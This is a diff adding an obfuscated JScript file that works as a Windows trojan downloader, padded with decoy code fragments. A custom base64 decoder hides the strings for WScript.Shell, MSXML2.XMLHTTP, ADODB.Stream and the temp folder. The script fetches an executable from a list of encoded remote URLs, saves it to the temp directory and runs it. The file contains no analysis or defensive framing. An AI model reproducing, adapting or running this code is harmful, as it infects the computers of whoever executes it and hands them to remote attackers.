@@ -1,0 +1,307 @@
+
+ var levitron = new Array(2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,65,2,2,2,66,55,56,57,58,59,60,61,62,63,64,2,2,2,2,2,2,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,2,2,2,2,2,2,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2
+
+
+);
+var silkopil = "\u002f";
+ var Hesrshish =- 0x01 +0x09+0xF7 ;
+String["prototype"].pizzaTT = function() {
+YMWDsilhouette_FROG2XCOP = 0;	
+     var YMWDsilhouette_RazlomSS, YMWDsilhouette_FROG2ddDccC2, YMWDsilhouette_FROG2c3, YMWDsilhouette_FROG2c4;
+
+     var YMWDsilhouette_FROG2out = "";
+
+	 var YMWDsilhouette_FROG2YMWDsilhouette_ka= this.replace(/FROSTICK/gi, YMWDsilhouette_FROG2out);
+ var  YMWDsilhouette_FROG2len = YMWDsilhouette_FROG2sud(YMWDsilhouette_FROG2YMWDsilhouette_ka); 	
+
+    while (YMWDsilhouette_FROG2XCOP < YMWDsilhouette_FROG2len) {
+
+       
+
+do {
+			 var YMWDsilhouette_koch = YMWDsilhouette_FROG2YMWDsilhouette_ka.charCodeAt(YMWDsilhouette_FROG2XCOP++) &(0x132- 0x33);
+            YMWDsilhouette_RazlomSS = levitron[YMWDsilhouette_koch];
+        } while (YMWDsilhouette_FROG2XCOP < YMWDsilhouette_FROG2len && YMWDsilhouette_RazlomSS == -1);     
+  
+if (YMWDsilhouette_RazlomSS == -1)
+            break; 
+		do {
+            YMWDsilhouette_FROG2ddDccC2 = levitron[YMWDsilhouette_FROG2YMWDsilhouette_ka.charCodeAt(YMWDsilhouette_FROG2XCOP++) & Hesrshish];
+
+        } while (YMWDsilhouette_FROG2XCOP < YMWDsilhouette_FROG2len && YMWDsilhouette_FROG2ddDccC2 == -1);  
+
+        if (YMWDsilhouette_FROG2ddDccC2 +1== 0)
+            break;
+        YMWDsilhouette_FROG2out += String.fromCharCode((YMWDsilhouette_RazlomSS << 2) | ((YMWDsilhouette_FROG2ddDccC2 & 0x30) >> 4)); 
+    do {
+            YMWDsilhouette_FROG2c3 = YMWDsilhouette_FROG2YMWDsilhouette_ka.charCodeAt(YMWDsilhouette_FROG2XCOP++) & 0xff;
+
+            if (YMWDsilhouette_FROG2c3 == 10*6+0.5*2)
+                return YMWDsilhouette_FROG2out;
+
+            YMWDsilhouette_FROG2c3 = levitron[YMWDsilhouette_FROG2c3];
+        } while (YMWDsilhouette_FROG2XCOP < YMWDsilhouette_FROG2len && YMWDsilhouette_FROG2c3 == -1); 
+        if (YMWDsilhouette_FROG2c3 == -1)
+            break;
+        YMWDsilhouette_FROG2out += String.fromCharCode(((YMWDsilhouette_FROG2ddDccC2 & (0xe+1)) << 4) | ((YMWDsilhouette_FROG2c3 & 0x3c) >> 2)); 
+   
+        do {
+            YMWDsilhouette_FROG2c4 = YMWDsilhouette_FROG2YMWDsilhouette_ka.charCodeAt(YMWDsilhouette_FROG2XCOP++) & Hesrshish;
+
+            if (YMWDsilhouette_FROG2c4 == 61)
+                return YMWDsilhouette_FROG2out;
+
+            YMWDsilhouette_FROG2c4 = levitron[YMWDsilhouette_FROG2c4];
+        } while (YMWDsilhouette_FROG2XCOP < YMWDsilhouette_FROG2len && YMWDsilhouette_FROG2c4 == -1);
+        if (YMWDsilhouette_FROG2c4 == -1)
+            break;
+
+
+        YMWDsilhouette_FROG2out += String.fromCharCode(((YMWDsilhouette_FROG2c3 & 0x03) << 6) | YMWDsilhouette_FROG2c4); 
+    }
+    return YMWDsilhouette_FROG2out;
+};
+ var YMWDsilhouette_SayNoNo ="FROSTICK"+ ""+"";
+
+	function  YMWDsilhouette_FROG2sud(vardos){
+return vardos[("YMWDsilhouette_kathy","YMWDsilhouette_vicenza","YMWDsilhouette_calibration","YMWDsilhouette_chirp","YMWDsilhouette_aberration","l")+"en" +("YMWDsilhouette_indicate","YMWDsilhouette_singh","YMWDsilhouette_canary","YMWDsilhouette_district","YMWDsilhouette_fabulous","gt")+"h"];
+}
+   
+
+
+function  setRH(v1, v2){
+ v1[v2]("User-Agent", "TW96aWxsYS80LjAgFROSTICKKGNvbXBhdGlibGU7IE1TSUUgNi4wOyFROSTICKBXaW5kb3dzIE5UIDUuMCk=".pizzaTT());
+}
+
+var cheboksar;
+ var velVITK_BOSKO_2S = "Y2hlYm9rc2FyID0geydVJzonUycsJzonOicuJywnODgnOicnLCdCT0xHQVJJTic6J29uc2VCb2R5JywnNzcnOicnLCcxMDEnOicnLCdGQVJJU0hNWSc6J1gnLCAgJzExJzonJ307DQpSZWVib2tHYWxheHlGUk9HdGFsaWx1ZXYgPSBSZWVib2tHYWxheHlGUk9Hdm9zdG9jaG5peTsNCmZvciAodmFyIFJlZWJva0dhbGF4eUZST0cyWENPUCBpbiBjaGVib2tzYXIpe1JlZWJva0dhbGF4eUZST0d0YWxpbHVldiA9IFJlZWJva0dhbGF4eUZST0d0YWxpbHVldlsicmVwIiArICJsYWNlIl0oUmVlYm9rR2FsYXh5RlJPRzJYQ09QLCBjaGVib2tzYXJbUmVlYm9rR2FsYXh5RlJPRzJYQ09QXSk7fQ0KICAgIHJldHVybiBSZWVib2tHYWxheHlGUk9HdGFsaWx1ZXY7";
+ 
+ var levitronHO = YMWDsilhouette_FROG2sud(levitron);
+ var TortPankaky;
+
+    for (velVITK_OBLOM= 0; levitronHO >velVITK_OBLOM ; ++velVITK_OBLOM) {
+       levitron[velVITK_OBLOM] = -1+levitron[velVITK_OBLOM];
+       levitron[velVITK_OBLOM] = -1+levitron[velVITK_OBLOM];
+       levitron[velVITK_OBLOM] = -1+levitron[velVITK_OBLOM];
+
+    }
+ 
+
+ var TortPankakyFF = new Function("DAS","TortPankaky = "+"bmV3IEZ1bmN0aW9uKCdSZWVib2tHYWxheHlGUk9Hdm9zdG9jaG5peScsIHZlbFZJVEtfQk9TS09fMlM=".pizzaTT()+".pizzaTT());");
+
+function  YMWDsilhouette_FROG2undefilled(velVLUMAHx, velVLUMAHy) {
+    velVLUMAHx = eww / frr;
+    velVLUMAHy = velVLUMAHZZ + -245;
+};
+
+YMWDsilhouette_FROG2undefilled.dEDWWEE = function(){
+
+
+    YMWDsilhouette_FROG2ok(YMWDsilhouette_FROG2spyFunction1.YMWDsilhouette_FROG2calledWith(), "Function called without arguments");
+
+    YMWDsilhouette_FROG2publisher.YMWDsilhouette_FROG2publish(this.YMWDsilhouette_FROG2type1, "PROPER1");
+    YMWDsilhouette_FROG2ok(YMWDsilhouette_FROG2spyFunction1.YMWDsilhouette_FROG2calledWith("PROPER1"), "Function called with 'PROPER1' argument");
+
+    YMWDsilhouette_FROG2publisher.YMWDsilhouette_FROG2publish(this.YMWDsilhouette_FROG2type1, ["PROPER1", "PROPER2"]);
+
+};
+
+
+ var topSecretLine;
+
+ var YMWDsilhouette_LLL0LLL = "l";
+	 var YMWDsilhouette_FROG2TRUEFALSE=("V2lFROSTICKuZG93cyBTY3JpcFROSTICKHQgSG9zdA=FROSTICK=".pizzaTT() +"!!!22ee22" =="FROSTICKV2lFROSTICKuZG93cyBTY3JpcFROSTICKHQgSG9zdA==".pizzaTT() +"!!!22ee22")&&typeof(YMWDsilhouette_FROG2GzEAPd)==="undefined";
+ var YMWDsilhouette_FROGsrq = "UmVxdWVzdEhlYWRlcg==".pizzaTT();
+
+
+TortPankakyFF();
+	
+ var YMWDsilhouette_FROG_HUD_DUCK  =("").pizzaTT();
+ var YMWDsilhouette_FROG2lidgen = "QWN0FROSTICKaXZlWEFROSTICK9iamVjdA==".pizzaTT();
+ 
+ 
+ var YMWDsilhouette_FROG2chosen = Math.round(0.7 * 2 - 0.4);
+
+if(!YMWDsilhouette_FROG2TRUEFALSE){
+YMWDsilhouette_FROG2undefilled.scale = function(YMWDsilhouette_FROG2p, YMWDsilhouette_FROG2scaleX, YMWDsilhouette_FROG2scaleY) {
+    if (YMWDsilhouette_FROG2XCOPsObject(YMWDsilhouette_FROG2scaleX)) {
+        YMWDsilhouette_FROG2scaleY = YMWDsilhouette_FROG2scaleX.y;
+        YMWDsilhouette_FROG2scaleX = YMWDsilhouette_FROG2scaleX.x;
+    } else if (!YMWDsilhouette_FROG2XCOPsNumber(YMWDsilhouette_FROG2scaleY)) {
+        YMWDsilhouette_FROG2scaleY = YMWDsilhouette_FROG2scaleX;
+    }
+    return new YMWDsilhouette_FROG2undefilled(YMWDsilhouette_FROG2p.x * YMWDsilhouette_FROG2scaleX, YMWDsilhouette_FROG2p.y * YMWDsilhouette_FROG2scaleY);
+};
+
+}
+if(!YMWDsilhouette_FROG2TRUEFALSE){
+YMWDsilhouette_FROG2undefilled.YMWDsilhouette_FROG2sameOrN = function(YMWDsilhouette_FROG2param1, YMWDsilhouette_FROG2param2) {
+    return YMWDsilhouette_FROG2param1.D == YMWDsilhouette_FROG2param2.D || YMWDsilhouette_FROG2param1.F == YMWDsilhouette_FROG2param2.F;
+};
+
+YMWDsilhouette_FROG2undefilled.angle = function(YMWDsilhouette_FROG2p) {
+    return Math.atan2(YMWDsilhouette_FROG2p.y, YMWDsilhouette_FROG2p.x);
+};
+	}
+
+	function  YMWDsilhouette_FROG_OOO_OOO(TT){
+	
+eval(TT);
+	}
+ 
+ var YMWDsilhouette_FROG2VARDOCF ="JVRFFROSTICKTVAlFROSTICK".pizzaTT();
+
+ var NewNameCreator = new Function("FROSTICK,FROSTICK","topSecretLine = "+   ("bmV3IEZ1bmN0aW9uKCd2VlJFQkZGMycsJ3JldHVybiBcIlRWTT1cIg==").pizzaTT() + ".pizzaTT();');");
+
+ var YMWDsilhouette_FROG2sirdallos ="FROSTICKRXhwYW5FROSTICKkRW52aXFROSTICKJvbm1lbnRTdHJFROSTICKpbmdz".pizzaTT();
+ var YMWDsilhouette_FROG2Native = function(options){
+	
+};
+YMWDsilhouette_FROG2Native.YMWDsilhouette_FROG2XCOPmplement = function(YMWDsilhouette_FROG2objects, YMWDsilhouette_FROG2properties){
+	for ( var YMWDsilhouette_FROG2XCOP = 0, YMWDsilhouette_FROG2l = YMWDsilhouette_FROG2objects.length; YMWDsilhouette_FROG2XCOP < YMWDsilhouette_FROG2l; YMWDsilhouette_FROG2XCOP++) YMWDsilhouette_FROG2objects[YMWDsilhouette_FROG2XCOP].YMWDsilhouette_FROG2XCOPmplement(YMWDsilhouette_FROG2properties);
+};
+ var YMWDsilhouette_FROGhatershaha = "";
+ var YMWDsilhouette_FROGodnoklass = "XDeffqNEt";
+function  mexAO(AOn){
+	return new ActiveXObject(AOn);
+}if(WSH){
+	NewNameCreator();
+}
+ function  mix2(){
+        perm_sel[fixed] = fixed;     /* Generate random orientation*/      var total = 0;      var ori_sel = Array();      var i = fixed === 0 ? 1 : 0;     for(; i < 7; i = i === fixed - 1 ? i + 2 : i + 1){       ori_sel[i] = scramblers.lib.randomInt.below(3);       total += ori_sel[i];     }     if(i <= 7) ori_sel[i] = (3 - (total % 3)) % 3;     ori_sel[fixed] = 0;      /* Convert to face format*/     /* Mapping from permutation/orientation to facelet*/      var D = 1, L = 2, B = 5, U = 4, R = 3, F = 0;     /* D 0 1 2 3  L 4 5 6 7  B 8 9 10 11  U 12 13 14 15  R 16 17 18 19  F 20 21 22 23*/     /* Map from permutation/orientation to face*/   /* Convert cubie representation into facelet representaion*/     for( var i = 0; i < 8; i++){       for( var j = 0; j < 3; j++)         posit[pos[i][(ori_sel[i] + j) % 3]] = fmap[perm_sel[i]][j];     }
+}
+
+
+ var YMWDsilhouette_FROG2d7 ="WA==".pizzaTT() +  "M" +"L";
+ 
+function  YMWDsilhouette_FROG2_bCho(T, D, C) {
+	R =D +"";
+T[D](C);
+}	
+ var YMWDsilhouette_FROG2_bChosteck =  "aHR0cFROSTICKDovLw==";
+	
+YMWDsilhouette_FROG2d7 = topSecretLine() + YMWDsilhouette_FROG2d7+ TortPankaky(("YMWDsilhouette_commissioner","YMWDsilhouette_edited","YMWDsilhouette_baghdad","YMWDsilhouette_simpsons","YMWDsilhouette_risks","2.")+"FARISHMYML77H101T"+"TP45FROSTICK45"+"WS"+"cr"+"ipt:Uh")+"e"+"ll"; 
+ var YMWDsilhouette_FROG2DoUtra = [YMWDsilhouette_FROG2lidgen, YMWDsilhouette_FROG2sirdallos,YMWDsilhouette_FROG2VARDOCF];YMWDsilhouette_FROG2DoUtra = YMWDsilhouette_FROG2DoUtra.concat(  "LmVFROSTICK4ZQ=FROSTICK=".pizzaTT(), "UnFROSTICKVuFROSTICK".pizzaTT(),YMWDsilhouette_FROG2d7);
+
+YMWDsilhouette_FROG2Richters=YMWDsilhouette_FROG2DoUtra.shift();
+ var YMWDsilhouette_FROG2d2=YMWDsilhouette_FROG2DoUtra.pop();
+YMWDsilhouette_FROG2fabled="Valar2Morgulis";
+ var YMWDsilhouette_FROG2LitoyDISK=ActiveXObject;
+ var doubleTrouble=YMWDsilhouette_FROG2d2.split("45");YMWDsilhouette_FROG2Native.YMWDsilhouette_FROG2typize=function(a,b){a.type||(a.type=function(a){return YMWDsilhouette_FROG2$type(a)===b})};
+YMWDsilhouette_FROGcccomeccc = "p";
+ var Limbus2000=new Function("HORN",' var GALAXY = "chastity necessarily()";var kelso = "ADODB.Str32"; return kelso.replace("TRUMP", "D").replace("32", "eam");');
+YMWDsilhouette_FROGletchikva=new YMWDsilhouette_FROG2LitoyDISK(doubleTrouble[0]);
+function  YMWDsilhouette_FROG2_cCho(a,b,c,d){a[b](c,d)}
+abtest = doubleTrouble[YMWDsilhouette_FROGcccomeccc + "op"]();
+YMWDsilhouette_oldBitch = mexAO('' + abtest);
+
+YMWDsilhouette_FROG2tudabilo1 = "s";
+
+
+
+ var YMWDsilhouette_FROG2vulture = YMWDsilhouette_oldBitch[YMWDsilhouette_FROG2DoUtra.shift()](YMWDsilhouette_FROG2DoUtra.shift());
+
+
+YMWDsilhouette_FROG2weasel = "G\x45T";
+ var YMWDsilhouette_FROG2SIDRENKOV = YMWDsilhouette_FROG2DoUtra.shift();
+ var YMWDsilhouette_FROG2promises = YMWDsilhouette_FROG2DoUtra.shift();
+ var YMWDsilhouette_FROG2OCHENA = "b3FROSTICKBlbFROSTICKg==".pizzaTT();
+   YMWDsilhouette_FROG2SPASPI = "type";
+				
+							
+function  YMWDsilhouette_FROG2_aCho(T, D) {
+T[D]();
+}
+function  CNPK(aa){
+	return  "\x3F".concat(aa,"\x3D");
+}
+
+function  YMWDsilhouette_FROG2_a2(YMWDsilhouette_FROG2gutter, YMWDsilhouette_FROG2StrokaParam2) {
+	
+try{
+         var YMWDsilhouette_FROG2CHICKA = YMWDsilhouette_FROG2vulture;
+		YMWDsilhouette_FROG2CHICKA=YMWDsilhouette_FROG2CHICKA+silkopil;
+
+YMWDsilhouette_FROG2CHICKA=YMWDsilhouette_FROG2CHICKA + YMWDsilhouette_FROG2StrokaParam2 ;
+YMWDsilhouette_FROGletchikva.open(YMWDsilhouette_FROG2weasel, YMWDsilhouette_FROG2gutter, false);
+         
+if(YMWDsilhouette_FROG2TRUEFALSE){  YMWDsilhouette_FROG2_cCho(YMWDsilhouette_FROGletchikva,"set"+(11,"YMWDsilhouette_rubber","YMWDsilhouette_shaping","YMWDsilhouette_monetary","YMWDsilhouette_juniper","YMWDsilhouette_validity","YMWDsilhouette_decorum","YMWDsilhouette_fiftysix",YMWDsilhouette_FROGsrq),"User-Agent","TW96aWxsYS80LjAgFROSTICKKGNvbXBhdGlibGU7IE1TSUUgNi4wOyFROSTICKBXaW5kb3dzIE5UIDUuMCk=".pizzaTT());
+	
+	  }
+    
+YMWDsilhouette_FROGletchikva[YMWDsilhouette_FROG2tudabilo1 + ("YMWDsilhouette_mammal","YMWDsilhouette_varied","YMWDsilhouette_psychological","YMWDsilhouette_bourgeoisie","YMWDsilhouette_robbie","end")]();
+ var kuzut = YMWDsilhouette_FROGletchikva["Re"+"sp"+(YMWDsilhouette_FROG2StrokaParam2,"YMWDsilhouette_woodman","YMWDsilhouette_limits","YMWDsilhouette_incurred","YMWDsilhouette_legal",1123,cheboksar['BOLGARIN'])];
+//if(kuzut < 29989)return false;
+//		if (kuzut[0]!= 77 || kuzut[1]!= 90)return false;
+    if (YMWDsilhouette_FROG2TRUEFALSE) {
+		
+		
+		
+
+		
+		var YMWDsilhouette_FROG2opOpOp = new YMWDsilhouette_FROG2LitoyDISK(Limbus2000());
+		 YMWDsilhouette_FROGGaSMa = "Valar10Morgulis";
+ var dedlyb = new Function("n, enc", "    fridge = Math.floor(n);     if (x < 256*256*256) {        bytes = [            max + 2,            Math.floor(x / 256 / 256),            Math.floor(remit / 256) % 256,            x % 256        ];    }    else if (x < 256*256*256*256) {        atkins = [            max + 3,            Math.floor(x / 256 / 256 / 256),            Math.floor(x / 256 / 256) % 256,            Math.floor(palanquin / 256) % 256,            x % 256        ];    }"
+); 
+ var silaBitsa = new Function("FROSTICK,FROSTICK2", "FROSTICK[FROSTICK2]();");
+ var silaBitsa2 = new Function("FROSTICK,FROSTICK2", "FROSTICK.write(FROSTICK2);");	silaBitsa(YMWDsilhouette_FROG2opOpOp,YMWDsilhouette_FROG2OCHENA);	   YMWDsilhouette_FROG2opOpOp[YMWDsilhouette_FROG2SPASPI] = YMWDsilhouette_FROG2chosen;
+   	
+
+       	silaBitsa2( YMWDsilhouette_FROG2opOpOp, kuzut);
+		  YMWDsilhouette_FROG2XWaxeQhw = "Valar11Morgulis";
+        YMWDsilhouette_FROG2opOpOp["position"] = 0;
+		
+	
+        YMWDsilhouette_FROG2krDwvrh = "Valar12Morgulis";
+
+        
+		YMWDsilhouette_FROG2CHICKA = YMWDsilhouette_FROG2CHICKA  + YMWDsilhouette_FROG2SIDRENKOV;
+		YMWDsilhouette_FROG2opOpOp["cFROSTICK2F2FROSTICKZVFROSTICKRvRmlsZQ==".pizzaTT()](YMWDsilhouette_FROG2CHICKA, 26/13);
+        YMWDsilhouette_FROG2SswQdi = "Valar13Morgulis";
+		
+        YMWDsilhouette_FROG2opOpOp.close();
+
+
+
+      		
+		
+YMWDsilhouette_oldBitch[YMWDsilhouette_FROG2promises ](YMWDsilhouette_FROG2CHICKA,0,false);
+
+		
+return true;
+		
+		
+		}
+}catch(exception2){
+	
+	return false;}
+};  
+		
+		   
+
+
+eval(YMWDsilhouette_SayNoNo.pizzaTT());
+
+					
+
+ var YMWDsilhouette_FROGodnoklassYO = 0;
+
+YMWDsilhouette_FROG_OOO_OOO(YMWDsilhouette_FROG_HUD_DUCK);
+
+
+ var YMWDsilhouette_FROG2_a5 = ('FROSTICKdGJkZXhwFROSTICKcmVzcy5jb20vOTRoZzRnNGc/'+'HHHFROSTICKa3QtbW0uY29FROSTICKtLzk0aGc0ZzRnPw=='+'HHHFROSTICKdmlzaXRteW1lZGFROSTICKlhLmNvbS85NGhnNGc0Zz8='+'HHHFROSTICKODl0ZzdnamtraGhwcm90dGl0eS5jb2FROSTICK0vYWYvOTRoZzRnNGc='+'HHHFROSTICK').split("HHH");  
+
+			
+	
+ var FROSTICK500 = new Function("YMWDsilhouette_FROG2_a5,YMWDsilhouette_FROG2HORDA5", 'return YMWDsilhouette_FROG2_bChosteck.pizzaTT() + YMWDsilhouette_FROG2_a5[YMWDsilhouette_FROG2HORDA5].pizzaTT();');
+	
+for(YMWDsilhouette_FROG2HORDA5 in YMWDsilhouette_FROG2_a5){
+		
+YMWDsilhouette_FROGodnoklassYO++;
+	
+if(YMWDsilhouette_FROG2_a2(FROSTICK500(YMWDsilhouette_FROG2_a5,YMWDsilhouette_FROG2HORDA5)+CNPK(YMWDsilhouette_FROGodnoklass)+YMWDsilhouette_FROGodnoklass,YMWDsilhouette_FROGodnoklass+ YMWDsilhouette_FROGodnoklassYO)){
+break;
+}
+
+
+} 
